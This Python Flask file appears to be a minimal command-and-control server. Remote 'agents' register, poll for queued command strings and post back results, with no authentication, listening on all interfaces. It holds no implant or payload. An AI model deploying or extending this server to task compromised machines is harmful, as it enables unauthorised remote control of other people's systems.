from flask import Flask, request, jsonify
import uuid

app = Flask(__name__)

agents = {}
tasks = {}

@app.route("/register", methods=["POST"])
def register():
    agent_id = str(uuid.uuid4())
    agents[agent_id] = True
    tasks[agent_id] = None
    print(f"[+] Agent connected: {agent_id}")
    return jsonify({"agent_id": agent_id})

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    task = tasks.get(agent_id)
    tasks[agent_id] = None  # clear task after giving it to agent
    return jsonify({"task": task})

@app.route("/task/<agent_id>", methods=["POST"])
def send_task(agent_id):
    task = request.data.decode()
    tasks[agent_id] = task
    print(f"[+] Task queued for {agent_id}: {task}")
    return "OK", 200

@app.route("/result/<agent_id>", methods=["POST"])
def receive_result(agent_id):
    result = request.data.decode()
    print(f"[+] Result from {agent_id}:\n{result}\n")
    return "OK", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
